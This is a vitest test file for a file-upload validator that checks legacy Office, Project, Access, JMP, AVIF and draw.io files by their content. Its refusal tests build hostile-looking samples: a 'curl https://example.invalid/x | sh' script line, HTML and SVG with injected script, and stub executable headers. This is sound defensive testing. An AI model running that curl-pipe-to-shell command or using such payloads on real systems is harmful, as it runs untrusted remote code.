import { describe, it, expect } from 'vitest';
import { readFileSync } from 'fs';
import path from 'path';
import { validateFileType, SIGNATURE_FORMATS, FileValidationError, INLINE_SAFE_MIMES } from '../../src/lib/file-validation';
import { openCompoundFile, MAX_ROOT_ENTRIES } from '../../src/lib/cfb';
import { prepareAvif, AvifRefusedError } from '../../src/lib/file-store';
import { makeCfb } from '../cfb-helper';

/**
 * #303: types an admin can allow that file-type cannot name (or names only as their
 * container): legacy Office compound files, Project, Access, JMP, AVIF and draw.io. Each is
 * stored only when its own content check passes; the extension alone is never enough.
 */

const EXTS = Object.keys(SIGNATURE_FORMATS);
const ALLOWED = [...EXTS, 'txt', 'xml', 'zip', 'pdf', 'png'];
const fixture = (name: string) => readFileSync(path.join(__dirname, '..', 'fixtures', 'files', name));

async function refusal(promise: Promise<unknown>): Promise<FileValidationError> {
    try {
        await promise;
    } catch (err) {
        if (err instanceof FileValidationError) return err;
        throw err;
    }
    throw new Error('expected a FileValidationError');
}

// The CompObj stream of a real Microsoft Project 2016 plan: user type "Microsoft.Project 16.0",
// format "MSProject.MPP14", program id "MSProject.Project.9". No project content.
const MPP14_COMPOBJ = Buffer.from(
    '0100feff030a0000ffffffff3a8fb774c8c8d111be1100c04fb6faf1170000004d6963726f736f66742e50726f6a6563742031362e30'
    + '00100000004d5350726f6a6563742e4d5050313400140000004d5350726f6a6563742e50726f6a6563742e3900f439b27100000000'
    + '0000000000000000', 'hex');
// The CompObj stream of a real Excel 2003 workbook (format "Biff8", program id "Excel.Sheet.8")
const XLS_COMPOBJ = Buffer.from(
    '0100feff030a0000ffffffff2008020000000000c000000000000046260000004d6963726f736f6674204f666669636520457863656c'
    + '203230303320576f726b736865657400060000004269666638000e000000457863656c2e53686565742e3800f439b2710000000000'
    + '0000000000000000', 'hex');

const mpp = () => makeCfb([
    { name: '\u0001CompObj', data: MPP14_COMPOBJ },
    { name: '   114', data: Buffer.alloc(5000, 1) },
    { name: 'Props14', data: Buffer.alloc(300, 2) },
]);
/** A Workbook stream opening with a BIFF8 BOF record. */
const xlsStream = (size = 600) => { const b = Buffer.alloc(size); b.writeUInt16LE(0x0809, 0); b.writeUInt16LE(16, 2); return b; };

// The first 24 bytes of a real Access 2007+ database's header page: version 2 (ACE12)
const ACCDB_HEAD = Buffer.from('000100005374616e64617264204143452044420002000000', 'hex');
const accdb = (head = ACCDB_HEAD) => { const b = Buffer.alloc(8192, 0x5a); head.copy(b); return b; };

// The ftyp box of a real AVIF photo: major brand avif, compatible avif, mif1, miaf
const AVIF_FTYP = Buffer.from('0000001c667479706176696600000000617669666d6966316d696166', 'hex');

async function avifImage(exif?: Record<string, string>): Promise<Buffer> {
    const sharp = (await import('sharp')).default;
    const img = sharp({ create: { width: 16, height: 12, channels: 3, background: { r: 200, g: 40, b: 40 } } }).avif();
    return (exif ? img.withExif({ IFD0: exif }) : img).toBuffer();
}

const DRAWIO_PLAIN = '<?xml version="1.0" encoding="UTF-8"?>\n<!-- exported -->\n<mxfile host="Electron">\n  <diagram name="Page-1" id="a">\n    <mxGraphModel><root><mxCell id="0"/></root></mxGraphModel>\n  </diagram>\n</mxfile>\n';

/** Every format's real or real-derived sample, keyed by its extension. */
async function samples(): Promise<[string, string, Buffer][]> {
    return [
        ['xls', 'Excel 97-2003 (POI)', fixture('poi-SampleSS.xls')],
        ['xls', 'Excel 95, BIFF5 Book stream (POI)', fixture('poi-testEXCEL_95.xls')],
        ['doc', 'Word 97-2003 (POI)', fixture('poi-SampleDoc.doc')],
        ['ppt', 'PowerPoint 97-2003 (POI)', fixture('poi-basic_test_ppt_file.ppt')],
        ['mpp', 'Project 2016 CompObj', mpp()],
        ['accdb', 'Access 2007 header', accdb()],
        ['jmp', 'JMP table (JMPReader.jl)', fixture('jmpreader-singlecolumnsinglerow.jmp')],
        ['avif', 'AVIF from sharp', await avifImage()],
        ['avif', 'real AVIF ftyp box', Buffer.concat([AVIF_FTYP, Buffer.alloc(200)])],
        ['drawio', 'compressed diagram (Fastify docs)', fixture('fastify-encapsulation_context.drawio')],
        ['drawio', 'uncompressed diagram', Buffer.from(DRAWIO_PLAIN)],
    ];
}

describe('each format is stored under its own type', () => {
    it('every sample passes as its own extension and as no other', async () => {
        for (const [ext, label, buf] of await samples()) {
            expect(await validateFileType(buf, ext, ALLOWED), label).toEqual({ mime: SIGNATURE_FORMATS[ext].mime, ext });
            for (const other of EXTS.filter(e => e !== ext)) {
                const err = await refusal(validateFileType(buf, other, ALLOWED));
                expect([err.status, err.message], `${label} named .${other}`).toEqual([415, 'File content does not match its extension']);
            }
        }
    });

    it('the stored types', () => {
        expect(Object.fromEntries(EXTS.map(e => [e, SIGNATURE_FORMATS[e].mime]))).toEqual({
            xls: 'application/vnd.ms-excel', doc: 'application/msword', ppt: 'application/vnd.ms-powerpoint',
            mpp: 'application/vnd.ms-project', accdb: 'application/x-msaccess', jmp: 'application/x-jmp',
            avif: 'image/avif', drawio: 'application/xml',
        });
    });

    it('none of these types is ever served inline', () => {
        for (const ext of EXTS) expect(INLINE_SAFE_MIMES.has(SIGNATURE_FORMATS[ext].mime), ext).toBe(false);
    });

    it('an extension named like an Object property is not a type', async () => {
        for (const ext of ['constructor', 'tostring', 'hasownproperty']) {
            expect((await refusal(validateFileType(Buffer.from('hello'), ext, [ext]))).status).toBe(415);
        }
    });

    it('the extension still has to be allowed', async () => {
        const err = await refusal(validateFileType(fixture('poi-SampleSS.xls'), 'xls', ['xlsx', 'pdf']));
        expect([err.status, err.message]).toEqual([415, 'File type not allowed']);
    });
});

describe('a renamed executable or script is refused under every one of these extensions', () => {
    const pe = Buffer.concat([Buffer.from('MZ'), Buffer.alloc(58), Buffer.from([0x80, 0, 0, 0]), Buffer.from('This program cannot be run in DOS mode.'), Buffer.alloc(100), Buffer.from('PE\0\0'), Buffer.alloc(8000)]);
    const elf = Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0]), Buffer.alloc(8000)]);
    const macho = Buffer.concat([Buffer.from('cffaedfe07000001', 'hex'), Buffer.alloc(8000)]);
    const script = Buffer.from('#!/bin/sh\ncurl https://example.invalid/x | sh\n');
    const html = Buffer.from('<!doctype html><html><body><script>alert(1)</script></body></html>');
    const svg = Buffer.from('<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>');
    // Right magic bytes, nothing behind them
    const cfbMagicOnly = Buffer.concat([Buffer.from('d0cf11e0a1b11ae1', 'hex'), pe]);

    it.each([['Windows .exe', pe], ['ELF binary', elf], ['Mach-O binary', macho], ['shell script', script], ['HTML page', html], ['SVG with a script', svg], ['compound file magic over an .exe', cfbMagicOnly]])('%s', async (_label, buf) => {
        for (const ext of EXTS) {
            const err = await refusal(validateFileType(buf, ext, ALLOWED));
            expect([err.status, err.message], `.${ext}`).toEqual([415, 'File content does not match its extension']);
        }
    });
});

describe('compound files: the right streams, not just the container', () => {
    it.each([3, 4] as const)('an Excel workbook built from scratch is an .xls (compound file version %i)', async (version) => {
        for (const size of [600, 9000]) {
            const buf = makeCfb([{ name: 'Workbook', data: xlsStream(size) }], { version });
            expect((await validateFileType(buf, 'xls', ALLOWED)).mime, `${size}-byte stream`).toBe('application/vnd.ms-excel');
        }
    });

    it.each([
        ['an empty compound file', makeCfb([])],
        ['a Workbook stream without a BOF record', makeCfb([{ name: 'Workbook', data: Buffer.alloc(600, 7) }])],
        ['a Word document', fixture('poi-SampleDoc.doc')],
        ['a Project plan', mpp()],
        ['an Excel CompObj with no workbook', makeCfb([{ name: '\u0001CompObj', data: XLS_COMPOBJ }])],
    ])('.xls refuses %s', async (_label, buf) => {
        expect((await refusal(validateFileType(buf, 'xls', ALLOWED))).status).toBe(415);
    });

    it.each([
        ['an Excel CompObj', makeCfb([{ name: '\u0001CompObj', data: XLS_COMPOBJ }, { name: 'Workbook', data: xlsStream() }])],
        ['a Project template (MPT), not a plan', makeCfb([{ name: '\u0001CompObj', data: Buffer.from(MPP14_COMPOBJ.toString('latin1').replace('MSProject.MPP14', 'MSProject.MPT14'), 'latin1') }])],
        ['the format name outside the CompObj stream', makeCfb([{ name: 'Props14', data: Buffer.from('MSProject.MPP14\0') }])],
    ])('.mpp refuses %s', async (_label, buf) => {
        expect((await refusal(validateFileType(buf, 'mpp', ALLOWED))).status).toBe(415);
    });

    it('a .ppt needs the CurrentUserAtom and a non-empty document stream, not just the stream names', async () => {
        const user = Buffer.alloc(40);
        user.writeUInt16LE(0x0ff6, 2);
        const ppt = (userData: Buffer, doc: Buffer) => makeCfb([{ name: 'Current User', data: userData }, { name: 'PowerPoint Document', data: doc }]);
        expect((await validateFileType(ppt(user, Buffer.alloc(100)), 'ppt', ALLOWED)).mime).toBe('application/vnd.ms-powerpoint');
        expect((await refusal(validateFileType(ppt(Buffer.alloc(40), Buffer.alloc(100)), 'ppt', ALLOWED))).status).toBe(415);
        expect((await refusal(validateFileType(ppt(user, Buffer.alloc(0)), 'ppt', ALLOWED))).status).toBe(415);
    });
});

describe('a malformed compound file is refused, never loops or reads out of bounds', () => {
    const workbook = () => makeCfb([{ name: 'Workbook', data: xlsStream() }]);
    const FAT = 512; // sector 0 is the FAT; sector 1 the directory (test/cfb-helper.ts)

    it.each([
        ['a directory chain that points at itself', (b: Buffer) => b.writeUInt32LE(1, FAT + 4)],
        ['a directory outside the file', (b: Buffer) => b.writeUInt32LE(9999, 0x30)],
        ['more FAT sectors than the file has', (b: Buffer) => b.writeUInt32LE(0xffff, 0x2c)],
        ['a FAT sector outside the file', (b: Buffer) => b.writeUInt32LE(9999, 0x4c)],
        ['a mini stream whose sector chain loops', (b: Buffer) => b.writeUInt32LE(3, FAT + 3 * 4)], // sector 3 is the mini stream
        ['a mini stream outside the file', (b: Buffer) => b.writeUInt32LE(9999, 512 * 2 + 0x74)],
        ['a 4096-byte sector size in a version 3 file', (b: Buffer) => b.writeUInt16LE(12, 0x1e)],
        ['a root entry that is not a root', (b: Buffer) => b.writeUInt8(1, 512 * 2 + 0x42)],
        ['everything after the header zeroed', (b: Buffer) => b.fill(0, 512)],
    ])('%s', async (_label, corrupt) => {
        const buf = workbook();
        corrupt(buf);
        expect((await refusal(validateFileType(buf, 'xls', ALLOWED))).status).toBe(415);
    });

    it(`a directory with more than ${MAX_ROOT_ENTRIES} entries under the root is refused without walking it`, async () => {
        const streams = Array.from({ length: MAX_ROOT_ENTRIES + 1 }, (_, i) => ({ name: `s${i}`, data: Buffer.alloc(0) }));
        const big = makeCfb([{ name: 'Workbook', data: xlsStream() }, ...streams], { version: 4 });
        expect(openCompoundFile(big)).toBeNull();
        expect((await refusal(validateFileType(big, 'xls', ALLOWED))).status).toBe(415);
        // One fewer is a (strange but) readable file
        const ok = makeCfb([{ name: 'Workbook', data: xlsStream() }, ...streams.slice(2)], { version: 4 });
        expect(openCompoundFile(ok)?.root.size).toBe(MAX_ROOT_ENTRIES);
    });

    it('a directory whose sibling links form a cycle is read once per entry', () => {
        const buf = workbook();
        buf.writeUInt32LE(1, 512 * 2 + 128 + 0x48); // entry 1's right sibling is itself
        expect([...openCompoundFile(buf)!.root.keys()]).toEqual(['WORKBOOK']);
    });

    it('a truncated real workbook', async () => {
        const xls = fixture('poi-SampleSS.xls');
        expect((await refusal(validateFileType(xls.subarray(0, 1024), 'xls', ALLOWED))).status).toBe(415);
    });
});

describe('Access, JMP, AVIF and draw.io', () => {
    it.each([
        ['an Access 97-2003 (Jet) database', accdb(Buffer.from('000100005374616e64617264204a65742044420001000000', 'hex'))],
        ['an ACE header with version 1', accdb(Buffer.from('000100005374616e64617264204143452044420001000000', 'hex'))],
        ['only the header, no page', ACCDB_HEAD],
    ])('.accdb refuses %s', async (_label, buf) => {
        expect((await refusal(validateFileType(buf, 'accdb', ALLOWED))).status).toBe(415);
    });

    it('.jmp takes another format version, but not a header that is only ff ff 00 00', async () => {
        const jmp = (at: number, value: number) => { const b = Buffer.from(fixture('jmpreader-singlecolumnsinglerow.jmp')); b.writeUInt32LE(value, at); return b; };
        expect((await validateFileType(jmp(4, 8), 'jmp', ALLOWED)).mime).toBe('application/x-jmp');
        for (const [at, value] of [[4, 0], [4, 0x01000000], [8, 0], [8, 0xffffffff], [0, 0xffff0000]]) {
            expect((await refusal(validateFileType(jmp(at, value), 'jmp', ALLOWED))).status, `${value} at ${at}`).toBe(415);
        }
    });

    it.each([
        ['a HEIC photo', '00000018667479706865696300000000686569636d696631'],
        ['an MP4 video', '000000186674797069736f6d0000020069736f6d6d703431'],
        ['a box size past the end of the file', '0000ffff6674797061766966'],
    ])('.avif refuses %s', async (_label, hex) => {
        const buf = Buffer.concat([Buffer.from(hex, 'hex'), Buffer.alloc(64)]);
        expect((await refusal(validateFileType(buf, 'avif', ALLOWED))).status).toBe(415);
    });

    it.each([
        ['a BOM before the declaration', Buffer.concat([Buffer.from([0xef, 0xbb, 0xbf]), Buffer.from(DRAWIO_PLAIN)])],
        ['an mxGraphModel root', Buffer.from('<mxGraphModel dx="1"><root/></mxGraphModel>')],
    ])('.drawio accepts %s', async (_label, buf) => {
        expect(await validateFileType(buf, 'drawio', ALLOWED)).toEqual({ mime: 'application/xml', ext: 'drawio' });
    });

    it.each([
        ['another XML document', Buffer.from('<?xml version="1.0"?><note><to>x</to></note>')],
        ['an element that only starts like mxfile', Buffer.from('<mxfilex/>')],
        ['UTF-16 text', Buffer.from('﻿<mxfile/>', 'utf16le')],
        ['invalid UTF-8', Buffer.concat([Buffer.from('<mxfile>'), Buffer.from([0xc3, 0x28]), Buffer.from('</mxfile>')])],
        ['a NUL byte late in the file', Buffer.concat([Buffer.from('<mxfile>'), Buffer.alloc(20000, 0x20), Buffer.from([0]), Buffer.from('</mxfile>')])],
        ['an unterminated comment', Buffer.from('<!-- <mxfile/>')],
        ['a root element after 64 KB of comments', Buffer.from(`<!--${' '.repeat(70_000)}-->
<mxfile/>`)],
    ])('.drawio refuses %s', async (_label, buf) => {
        expect((await refusal(validateFileType(buf, 'drawio', ALLOWED))).status).toBe(415);
    });
});

describe('prepareAvif: AVIF photos lose their EXIF like JPEGs do', () => {
    it('an AVIF with EXIF is re-encoded without it', async () => {
        const sharp = (await import('sharp')).default;
        const withExif = await avifImage({ Copyright: 'secret-location' });
        expect((await sharp(withExif).metadata()).exif).toBeDefined();
        const out = await prepareAvif(withExif, true);
        expect([out.width, out.height]).toEqual([16, 12]);
        expect((await sharp(out.buffer).metadata()).exif).toBeUndefined();
        expect(out.buffer.includes(Buffer.from('secret-location'))).toBe(false);
    });

    it('kept byte for byte when it has no metadata, or when stripping is off', async () => {
        const clean = await avifImage();
        expect((await prepareAvif(clean, true)).buffer).toBe(clean);
        const withExif = await avifImage({ Copyright: 'x' });
        expect((await prepareAvif(withExif, false)).buffer).toBe(withExif);
    });

    it('an AVIF with EXIF that is too large to re-encode is refused, not stored with its metadata', async () => {
        await expect(prepareAvif(await avifImage({ Copyright: 'x' }), true, 100)).rejects.toBeInstanceOf(AvifRefusedError);
        const clean = await avifImage();
        expect((await prepareAvif(clean, true, 100)).buffer).toBe(clean); // nothing to remove
    });

    it('a file with only an AVIF ftyp box cannot be read', async () => {
        const fake = Buffer.concat([AVIF_FTYP, Buffer.from('MZ'), Buffer.alloc(500)]);
        expect(await validateFileType(fake, 'avif', ALLOWED)).toEqual({ mime: 'image/avif', ext: 'avif' });
        await expect(prepareAvif(fake, true)).rejects.toThrow();
    });
});
